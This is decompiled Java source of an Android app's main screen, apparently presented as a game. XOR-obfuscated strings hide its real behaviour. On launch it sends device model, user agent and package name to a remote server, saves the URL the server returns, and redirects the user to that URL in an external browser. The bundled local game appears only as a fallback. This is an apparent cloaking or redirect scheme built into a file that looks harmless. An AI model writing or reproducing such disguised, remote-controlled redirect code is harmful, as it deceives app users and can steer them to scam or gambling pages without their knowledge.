package com.shotwins.games;

import H.e;
import K.A0;
import K.y0;
import P0.c;
import T.t;
import W0.a;
import X0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.shotwins.games.MainActivity;
import com.shotwins.games.R;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import i1.p;
import j1.b;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.TimeUnit;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1864D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1865A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1866B;

    /* renamed from: C, reason: collision with root package name */
    public String f1867C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1868y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1869z;

    public MainActivity() {
        this.d.f2376b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        this.f1868y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1864D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1869z = t(new byte[]{81, -25, -16});
        this.f1865A = t(new byte[]{64, -12, -27, -104});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {50, 129, 151, 244};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1912a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1866B = getSharedPreferences(this.f1869z, 0);
        setContentView(((O0.a) this.f1868y.a()).f617a);
        u();
        WebSettings settings = ((O0.a) this.f1868y.a()).f618b.getSettings();
        d.d(settings, "getSettings(...)");
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        ((O0.a) this.f1868y.a()).f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1866B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1865A, null);
        if (string != null && !e1.d.q0(string)) {
            this.f1867C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{13, -32, -25, -124, 15});
        String str = t(new byte[]{90, -11, -29, -124, 65, -69, -72, -37, 75, -28, -5, -104, 93, -10, -70, Byte.MIN_VALUE, 64, -12, -29, -100, 31, -80, -91, -60, 2, -81, -16, -126, 94, -9, -31, -105, 89, -22, -8, -39, 91, -13, -27, -115, 92, -30, -4, -97, 83, -72, -92, -38, 69, -18, -27, -97, 87, -13, -28, -38, 86, -28, -31, -37}) + t2 + packageName;
        o oVar = new o();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        d.e(timeUnit, "unit");
        byte[] bArr = b.f2603a;
        long millis = timeUnit.toMillis(5L);
        if (millis > 2147483647L) {
            throw new IllegalArgumentException("timeout".concat(" too large.").toString());
        }
        if (millis == 0) {
            throw new IllegalArgumentException("timeout".concat(" too small.").toString());
        }
        oVar.f2472r = (int) millis;
        p pVar = new p(oVar);
        t tVar = new t(4);
        d.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        d.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f747a = lVar.a();
        String t3 = t(new byte[]{106, -84, -45, -111, 68, -24, -12, -111, 31, -52, -8, -112, 87, -19});
        String str2 = Build.MODEL;
        d.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{115, -30, -12, -111, 66, -11, -70, -72, 83, -17, -16, -127, 83, -26, -14}), t(new byte[]{87, -17, -70, -95, 97, -83, -14, -102, 9, -16, -86, -60, 28, -72}));
        String t4 = t(new byte[]{103, -14, -14, -122, 31, -64, -16, -111, 92, -11});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        e b2 = tVar.b();
        j jVar = new j(pVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3231e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3571a;
        jVar.f3232f = n.f3571a.g();
        t tVar2 = pVar.f2478a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f748b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f749c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f748b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (d.a(((m) gVar.f3225c.f3229b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3224b = gVar2.f3224b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1867C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.n0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.Q();
        y0Var.q0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1868y.a()).f618b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{84, -24, -5, -111, 8, -82, -72, -37, 83, -17, -13, -122, 93, -24, -13, -85, 83, -14, -28, -111, 70, -82, -2, -102, 86, -28, -17, -38, 90, -11, -6, -104}));
    }

    public final void w(String str) {
        ((O0.a) this.f1868y.a()).f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
